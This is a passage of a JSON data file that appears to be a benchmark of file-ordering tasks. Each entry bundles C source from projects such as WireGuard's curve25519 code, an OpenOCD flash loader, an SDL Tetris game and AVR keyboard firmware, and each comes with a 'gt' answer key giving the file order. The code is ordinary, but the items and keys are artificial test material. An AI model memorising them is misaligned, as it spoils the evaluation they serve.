spindump_json_value_field* schemaFields;\n  unsigned int nOtherFields;\n  struct spindump_json_value_field* otherFields;\n};\n\nstruct spindump_json_value_integer {\n  unsigned long long value;\n};\n\nstruct spindump_json_value_string {\n  char* value;\n};\n\nstruct spindump_json_value {\n  enum spindump_json_value_type type;\n  union {\n    struct spindump_json_value_array array;\n    struct spindump_json_value_record record;\n    struct spindump_json_value_integer integer;\n    struct spindump_json_value_string string;\n  } u;\n};\n\n\n\n\n\nstruct spindump_json_value*\nspindump_json_value_new_integer(unsigned long long value);\nstruct spindump_json_value*\nspindump_json_value_new_string(const char* bytes,\n                               size_t n);\nstruct spindump_json_value*\nspindump_json_value_new_record(unsigned int nSchemaFields,\n                               struct spindump_json_value_field* schemaFields,\n                               unsigned int nOtherFields,\n                               struct spindump_json_value_field* otherFields);\nstruct spindump_json_value*\nspindump_json_value_new_array(void);\nint\nspindump_json_value_new_array_element(struct spindump_json_value* array,\n                                      struct spindump_json_value* newElement);\nstruct spindump_json_value*\nspindump_json_value_copy(const struct spindump_json_value* value);\nvoid\nspindump_json_value_free(struct spindump_json_value* value);\nconst struct spindump_json_value*\nspindump_json_value_getfield(const char* field,\n                             const struct spindump_json_value* value);\nconst struct spindump_json_value*\nspindump_json_value_getrequiredfield(const char* field,\n                                     const struct spindump_json_value* value);\nconst struct spindump_json_value*\nspindump_json_value_getarrayelem(unsigned int index,\n                                 const struct spindump_json_value* value);\nunsigned long long\nspindump_json_value_getinteger(const struct spindump_json_value* value);\nconst char*\nspindump_json_value_getstring(const struct spindump_json_value* value);\nchar*\nspindump_json_value_tostring(const struct spindump_json_value* value);\n\n#endif\n\n'spindump/src/spindump_event_printer_json.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_EVENT_PRINTER_JSON_H\n#define SPINDUMP_EVENT_PRINTER_JSON_H\n\n\n\n\n\n#include <stdio.h>\n#include \"spindump_event.h\"\n#include \"spindump_json_value.h\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nint\nspindump_event_printer_json_print(const struct spindump_event* event,\n                                  char* buffer,\n                                  size_t length,\n                                  size_t* consumed);\n\n#endif\n",
        "gt": [
            "'spindump/src/spindump_json_value.h'",
            "'spindump/src/spindump_event_printer_json.h'",
            "'spindump/src/spindump_eventformatter_json.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'",
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'\n:\n\n\n#include <linux/simd.h>\n#include <asm/hwcap.h>\n#include <asm/neon.h>\n\nasmlinkage void curve25519_neon(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 basepoint[CURVE25519_KEY_SIZE]);\n\nstatic bool curve25519_use_neon __ro_after_init;\nstatic bool *const curve25519_nobs[] __initconst = { &curve25519_use_neon };\nstatic void __init curve25519_fpu_init(void)\n{\n\tcurve25519_use_neon = elf_hwcap & HWCAP_NEON;\n}\n\nstatic inline bool curve25519_arch(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\tbool used_arch = false;\n\n\tsimd_get(&simd_context);\n\tif (IS_ENABLED(CONFIG_KERNEL_MODE_NEON) &&\n\t    !IS_ENABLED(CONFIG_CPU_BIG_ENDIAN) && curve25519_use_neon &&\n\t    simd_use(&simd_context)) {\n\t\tcurve25519_neon(mypublic, secret, basepoint);\n\t\tused_arch = true;\n\t}\n\tsimd_put(&simd_context);\n\treturn used_arch;\n}\n\nstatic inline bool curve25519_base_arch(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\n\n'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'\n:\n\n\n#include <zinc/curve25519.h>\n#include \"../selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/string.h>\n#include <linux/random.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <crypto/algapi.h>\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"curve25519-x86_64-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_ARM)\n#include \"curve25519-arm-glue.c\"\n#else\nstatic bool *const curve25519_nobs[] __initconst = { };\nstatic void __init curve25519_fpu_init(void)\n{\n}\nstatic inline bool curve25519_arch(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\nstatic inline bool curve25519_base_arch(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\n#endif\n\n#if defined(CONFIG_ARCH_SUPPORTS_INT128) && defined(__SIZEOF_INT128__)\n#include \"curve25519-hacl64.c\"\n#else\n#include \"curve25519-fiat32.c\"\n#endif\n\nstatic const u8 null_point[CURVE25519_KEY_SIZE] = { 0 };\n\nbool curve25519(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\tconst u8 secret[CURVE25519_KEY_SIZE],\n\t\tconst u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\tif (!curve25519_arch(mypublic, secret, basepoint))\n\t\tcurve25519_generic(mypublic, secret, basepoint);\n\treturn crypto_memneq(mypublic, null_point, CURVE25519_KEY_SIZE);\n}\n\nbool curve25519_generate_public(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\tstatic const u8 basepoint[CURVE25519_KEY_SIZE] __aligned(32) = { 9 };\n\n\tif (unlikely(!crypto_memneq(secret, null_point, CURVE25519_KEY_SIZE)))\n\t\treturn false;\n\n\tif (curve25519_base_arch(pub, secret))\n\t\treturn crypto_memneq(pub, null_point, CURVE25519_KEY_SIZE);\n\treturn curve25519(pub, secret, basepoint);\n}\n\nvoid curve25519_generate_secret(u8 secret[CURVE25519_KEY_SIZE])\n{\n\tget_random_bytes_wait(secret, CURVE25519_KEY_SIZE);\n\tcurve25519_clamp_secret(secret);\n}\n\n#include \"../selftest/curve25519.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init curve25519_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tcurve25519_fpu_init();\n\tif (!selftest_run(\"curve25519\", curve25519_selftest, curve25519_nobs,\n\t\t\t  ARRAY_SIZE(curve25519_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"Curve25519 scalar multiplication\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'"
        ]
    },
    {
        "files": [
            "'tetris-sdl-c/src/graphics.h'",
            "'tetris-sdl-c/src/main.h'",
            "'tetris-sdl-c/src/main.c'"
        ],
        "content": "'tetris-sdl-c/src/graphics.h'\n:#include \"defs.h\"\n\nextern SDL_Window *window;\nextern SDL_Renderer *render;\nextern SDL_Texture *display;\nextern TTF_Font *gFont;\n\n\n\nextern bool render_changed;\n\nvoid init_graphics();\nvoid cleanup_graphics();\n\n\nvoid draw_block(uint8_t x, uint8_t y, uint32_t color);\n\nvoid setRenderChanged();\nvoid preRender();\nvoid updateRender();\n\n\n'tetris-sdl-c/src/main.h'\n:#include \"defs.h\"\n\n#include \"init.h\"\n#include \"graphics.h\"\n#include \"input.h\"\n#include \"tetris.h\"\n\n\nSDL_Window *window;\nSDL_Renderer *render;\nSDL_Texture *display;\nTTF_Font *gFont;\n\nbool render_changed;\n\n'tetris-sdl-c/src/main.c'\n:#include \"main.h\"\n\nint main(int argc, const char *argv[]) {\n\n\n\n    uint32_t flags = SDL_INIT_TIMER | SDL_INIT_VIDEO | SDL_INIT_EVENTS;\n    if (SDL_Init(SDL_INIT_EVERYTHING) != 0) {\n\n        fprintf(stderr,\n                \"\\nUnable to initialize SDL:  %s\\n\",\n                SDL_GetError());\n\n        return 1;\n    }\n\n    atexit(cleanup);\n\n    init();\n\n    bool quit = false;\n    while(!quit) {\n\n        preRender();\n\n        getInput();\n\n        updateTetris();\n\n        updateRender();\n\n\n\n        SDL_Delay(16);\n    }\n\n    return 0;\n}\n",
        "gt": [
            "'tetris-sdl-c/src/graphics.h'",
            "'tetris-sdl-c/src/main.h'",
            "'tetris-sdl-c/src/main.c'"
        ]
    },
    {
        "files": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'"
        ],
        "content": "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'\n:\n\n\n#ifndef samflashH\n#define samflashH\n\n#include \"platform.h\"\n\n#define FLASH_AREA_ADDR 0x100000\n\n#define FLASH_STAT_OK 0\n#define FLASH_STAT_PROGE 1\n#define FLASH_STAT_LOCKE 2\n#define FLASH_STAT_VERIFE 3\n#define FLASH_STAT_INITE 4\n\nextern unsigned int flash_page_count;\nextern unsigned int flash_page_size;\n\n\nint flash_init(void);\n\n\nint flash_page_program(uint32 *data, int page_num);\n\n\nint flash_erase_all(void);\n\n\nint flash_verify(uint32 adr, unsigned int len, uint8 *src);\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'\n:\n\n\n#ifndef platformH\n#define platformH\n\n#include \"samregs.h\"\n\n\n#define outb(_reg, _val)  (*((volatile unsigned char *)(_reg)) = (_val))\n#define outw(_reg, _val)  (*((volatile unsigned short *)(_reg)) = (_val))\n#define outr(_reg, _val)  (*((volatile unsigned int *)(_reg)) = (_val))\n\n#define inb(_reg)   (*((volatile unsigned char *)(_reg)))\n#define inw(_reg)   (*((volatile unsigned short *)(_reg)))\n#define inr(_reg)   (*((volatile unsigned int *)(_reg)))\n\n#define _BV(bit)    (1 << (bit))\n\n\ntypedef signed char int8;\ntypedef unsigned char uint8;\n\ntypedef signed short int16;\ntypedef unsigned short uint16;\n\ntypedef signed int int32;\ntypedef unsigned int uint32;\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'\n:\n\n\n\n\n#ifndef samregsH\n#define samregsH\n\n\n\n\n#define DBGU_BASE       0xFFFFF200\n\n#define DBGU_CIDR_OFF           0x00000040\n#define DBGU_CIDR   (DBGU_BASE + DBGU_CIDR_OFF)\n\n\n#define MC_BASE         0xFFFFFF00\n\n#define MC_FMR_OFF              0x00000060\n#define MC_FMR      (MC_BASE + MC_FMR_OFF)\n#define MC_FRDY                 0x00000001\n#define MC_LOCKE                0x00000004\n#define MC_PROGE                0x00000008\n#define MC_NEBP                 0x00000080\n#define MC_FWS_MASK             0x00000300\n#define MC_FWS_1R2W             0x00000000\n#define MC_FWS_2R3W             0x00000100\n#define MC_FWS_3R4W             0x00000200\n#define MC_FWS_4R4W             0x00000300\n#define MC_FMCN_MASK            0x00FF0000\n\n#define MC_FCR_OFF              0x00000064\n#define MC_FCR      (MC_BASE + MC_FCR_OFF)\n#define MC_FCMD_MASK            0x0000000F\n#define MC_FCMD_NOP             0x00000000\n#define MC_FCMD_WP              0x00000001\n#define MC_FCMD_SLB             0x00000002\n#define MC_FCMD_WPL             0x00000003\n#define MC_FCMD_CLB             0x00000004\n#define MC_FCMD_EA              0x00000008\n#define MC_FCMD_SGPB            0x0000000B\n#define MC_FCMD_CGPB            0x0000000D\n#define MC_FCMD_SSB             0x0000000F\n#define MC_PAGEN_MASK           0x0003FF00\n#define MC_KEY                  0x5A000000\n\n#define MC_FSR_OFF              0x00000068\n#define MC_FSR      (MC_BASE + MC_FSR_OFF)\n#define MC_SECURITY             0x00000010\n\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'\n:\n\n\n#include \"platform.h\"\n\n#include <flash/nor/ocl.h>\n#include \"dcc.h\"\n#include \"samflash.h\"\n\n\n#define BUFSIZE 1024\nuint32 buffer[1024];\n\nvoid cmd_flash(uint32 cmd)\n{\n\tunsigned int len;\n\tuint32 adr;\n\tuint32 chksum;\n\tunsigned int bi;\n\tunsigned int bi_start;\n\tunsigned int bi_end;\n\tunsigned int ofs;\n\tint pagenum;\n\tint result;\n\n\tadr = dcc_rd();\n\tlen = cmd&0xffff;\n\tofs = adr%flash_page_size;\n\tbi_start = ofs/4;\n\tbi_end = (ofs + len + 3)/4;\n\n\tif (bi_end > BUFSIZE) {\n\t\tdcc_wr(OCL_BUFF_OVER);\n\t\treturn;\n\t}\n\n\tchksum = OCL_CHKS_INIT;\n\tfor (bi = 0; bi < bi_end; bi++) chksum^=buffer[bi]=dcc_rd();\n\n\tif (dcc_rd() != chksum) {\n\t\tdcc_wr(OCL_CHKS_FAIL);\n\t\treturn;\n\t}\n\n\n\tfor (bi = 0; bi < bi_start; bi++) buffer[bi]=0xffffffff;\n\tfor (bi = bi_end; bi%flash_page_size; bi++) buffer[bi]=0xffffffff;\n\n\tresult = 0;\n\tpagenum = adr/flash_page_size;\n\tfor (bi = 0; bi < bi_end; bi += flash_page_size/4) {\n\t\tresult = flash_page_program(buffer + bi, pagenum++);\n\t\tif (result) break;\n\t}\n\n\n\tif (!result) result = flash_verify(adr, len, ((uint8 *)buffer) + ofs);\n\n\tdcc_wr(OCL_CMD_DONE | result);\n}\n\n\nint main (void)\n{\n\tuint32 cmd;\n\n\tfor (;;) {\n\t\tcmd = dcc_rd();\n\t\tswitch (cmd&OCL_CMD_MASK) {\n\t\t\tcase OCL_PROBE:\n\t\t\t\tdcc_wr(OCL_CMD_DONE | flash_init());\n\t\t\t\tdcc_wr(0x100000);\n\t\t\t\tdcc_wr(flash_page_count*flash_page_size);\n\t\t\t\tdcc_wr(1);\n\t\t\t\tdcc_wr(4096 | ((unsigned long) flash_page_size << 16));\n\t\t\t\tbreak;\n\t\t\tcase OCL_ERASE_ALL:\n\t\t\t\tdcc_wr(OCL_CMD_DONE | flash_erase_all());\n\t\t\t\tbreak;\n\t\t\tcase OCL_FLASH_BLOCK:\n\t\t\t\tcmd_flash(cmd);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\n\t\t\t\tdcc_wr(OCL_CMD_ERR);\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn 0;\n}\n",
        "gt": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/main.c'",
            "'EasyAVR/firmware/src/LUFA/LUFA/Drivers/USB/USB.h'",
            "'EasyAVR/firmware/src/asf.h'"
        ],
        "content": "'EasyAVR/firmware/src/main.c'\n:\n\n\n#include <stddef.h>\n#include <stdint.h>\n#include <util/delay.h>\n\n\n#include <asf.h>\n\n\n#include \"debug.h\"\n#include \"lowlevel.h\"\n#include \"scheduler.h\"\n#include \"led.h\"\n#include \"matrix.h\"\n#include \"keymap.h\"\n#include \"mouse.h\"\n#include \"autokey.h\"\n#include \"nvm.h\"\n#include \"USB.h\"\n\n\nint main(void)\n{\n\n\tboard_init();\n\n\n\tinit_lowlevel();\n\tinit_debug();\n\tinit_nvm();\n\tinit_matrix();\n\tinit_led();\n\tinit_keymap();\n\tinit_mouse();\n\tinit_autokey();\n\tinit_scheduler();\n\tinit_USB();\n\n\n\tinitial_scan();\n\n\n\tUSB_Init();\n\n\n\tsei();\n\n\n\twhile (USB_DeviceState < DEVICE_STATE_Configured)\n\t\tUSB_service();\n\n\n\tschedule_start();\n\twhile (g_reset_requested == NO_RESET)\n\t\tUSB_service();\n\tschedule_stop();\n\n\n\tUSB_Disable();\n\n\n\tcli();\n\n\n\tDelay_MS(2000);\n\n\n\tif (g_reset_requested == RESET_TO_BOOT)\n\t\treset_to_bootloader();\n\n\n\tset_wdt_for_reset();\n\tfor (;;);\n}\n\n'EasyAVR/firmware/src/LUFA/LUFA/Drivers/USB/USB.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef __USB_H__\n#define __USB_H__\n\n\n\t\t#define __INCLUDE_FROM_USB_DRIVER\n\n\n\t\t#include \"../../Common/Common.h\"\n\t\t#include \"Core/USBMode.h\"\n\n\n\t\t#include \"Core/USBTask.h\"\n\t\t#include \"Core/Events.h\"\n\t\t#include \"Core/StdDescriptors.h\"\n\t\t#include \"Core/ConfigDescriptors.h\"\n\t\t#include \"Core/USBController.h\"\n\t\t#include \"Core/USBInterrupt.h\"\n\n\t\t#if defined(USB_CAN_BE_HOST) || defined(__DOXYGEN__)\n\t\t\t#include \"Core/Host.h\"\n\t\t\t#include \"Core/Pipe.h\"\n\t\t\t#include \"Core/HostStandardReq.h\"\n\t\t\t#include \"Core/PipeStream.h\"\n\t\t#endif\n\n\t\t#if defined(USB_CAN_BE_DEVICE) || defined(__DOXYGEN__)\n\t\t\t#include \"Core/Device.h\"\n\t\t\t#include \"Core/Endpoint.h\"\n\t\t\t#include \"Core/DeviceStandardReq.h\"\n\t\t\t#include \"Core/EndpointStream.h\"\n\t\t#endif\n\n\t\t#if defined(USB_CAN_BE_BOTH) || defined(__DOXYGEN__)\n\t\t\t#include \"Core/OTG.h\"\n\t\t#endif\n\n\t\t#include \"Class/AndroidAccessoryClass.h\"\n\t\t#include \"Class/AudioClass.h\"\n\t\t#include \"Class/CDCClass.h\"\n\t\t#include \"Class/HIDClass.h\"\n\t\t#include \"Class/MassStorageClass.h\"\n\t\t#include \"Class/MIDIClass.h\"\n\t\t#include \"Class/PrinterClass.h\"\n\t\t#include \"Class/RNDISClass.h\"\n\t\t#include \"Class/StillImageClass.h\"\n\n#endif\n\n\n'EasyAVR/firmware/src/asf.h'\n:\n\n#ifndef ASF_H\n#define ASF_H\n\n\n\n\n#include <user_board.h>\n\n\n#include <board.h>\n\n\n#include <interrupt.h>\n\n\n#include <LUFA/Common/Common.h>\n#include <LUFA/Version.h>\n\n\n#include <LUFA/Drivers/USB/USB.h>\n\n\n#include <compiler.h>\n#include <status_codes.h>\n\n\n#include <parts.h>\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/LUFA/LUFA/Drivers/USB/USB.h'",
            "'EasyAVR/firmware/src/asf.h'",
            "'EasyAVR/firmware/src/main.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'",
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'\n:\n\n\n#include <linux/simd.h>\n#include <asm/hwcap.h>\n#include <asm/neon.h>\n\nasmlinkage void curve25519_neon(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 basepoint[CURVE25519_KEY_SIZE]);\n\nstatic bool curve25519_use_neon __ro_after_init;\nstatic bool *const curve25519_nobs[] __initconst = { &curve25519_use_neon };\nstatic void __init curve25519_fpu_init(void)\n{\n\tcurve25519_use_neon = elf_hwcap & HWCAP_NEON;\n}\n\nstatic inline bool curve25519_arch(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\tbool used_arch = false;\n\n\tsimd_get(&simd_context);\n\tif (IS_ENABLED(CONFIG_KERNEL_MODE_NEON) &&\n\t    !IS_ENABLED(CONFIG_CPU_BIG_ENDIAN) && curve25519_use_neon &&\n\t    simd_use(&simd_context)) {\n\t\tcurve25519_neon(mypublic, secret, basepoint);\n\t\tused_arch = true;\n\t}\n\tsimd_put(&simd_context);\n\treturn used_arch;\n}\n\nstatic inline bool curve25519_base_arch(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\n\n'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'\n:#ifndef _ARCH_ARM_ASM_NEON\n#define _ARCH_ARM_ASM_NEON\n#define kernel_neon_begin() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#define kernel_neon_end() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'\n:\n\n\n#include <zinc/curve25519.h>\n#include \"../selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/string.h>\n#include <linux/random.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <crypto/algapi.h>\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"curve25519-x86_64-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_ARM)\n#include \"curve25519-arm-glue.c\"\n#else\nstatic bool *const curve25519_nobs[] __initconst = { };\nstatic void __init curve25519_fpu_init(void)\n{\n}\nstatic inline bool curve25519_arch(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 secret[CURVE25519_KEY_SIZE],\n\t\t\t\t   const u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\nstatic inline bool curve25519_base_arch(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\treturn false;\n}\n#endif\n\n#if defined(CONFIG_ARCH_SUPPORTS_INT128) && defined(__SIZEOF_INT128__)\n#include \"curve25519-hacl64.c\"\n#else\n#include \"curve25519-fiat32.c\"\n#endif\n\nstatic const u8 null_point[CURVE25519_KEY_SIZE] = { 0 };\n\nbool curve25519(u8 mypublic[CURVE25519_KEY_SIZE],\n\t\tconst u8 secret[CURVE25519_KEY_SIZE],\n\t\tconst u8 basepoint[CURVE25519_KEY_SIZE])\n{\n\tif (!curve25519_arch(mypublic, secret, basepoint))\n\t\tcurve25519_generic(mypublic, secret, basepoint);\n\treturn crypto_memneq(mypublic, null_point, CURVE25519_KEY_SIZE);\n}\n\nbool curve25519_generate_public(u8 pub[CURVE25519_KEY_SIZE],\n\t\t\t\tconst u8 secret[CURVE25519_KEY_SIZE])\n{\n\tstatic const u8 basepoint[CURVE25519_KEY_SIZE] __aligned(32) = { 9 };\n\n\tif (unlikely(!crypto_memneq(secret, null_point, CURVE25519_KEY_SIZE)))\n\t\treturn false;\n\n\tif (curve25519_base_arch(pub, secret))\n\t\treturn crypto_memneq(pub, null_point, CURVE25519_KEY_SIZE);\n\treturn curve25519(pub, secret, basepoint);\n}\n\nvoid curve25519_generate_secret(u8 secret[CURVE25519_KEY_SIZE])\n{\n\tget_random_bytes_wait(secret, CURVE25519_KEY_SIZE);\n\tcurve25519_clamp_secret(secret);\n}\n\n#include \"../selftest/curve25519.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init curve25519_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tcurve25519_fpu_init();\n\tif (!selftest_run(\"curve25519\", curve25519_selftest, curve25519_nobs,\n\t\t\t  ARRAY_SIZE(curve25519_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"Curve25519 scalar multiplication\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519-arm-glue.c'",
            "'wireguard-linux-compat/src/crypto/zinc/curve25519/curve25519.c'"
        ]
    },
    {
        "files": [
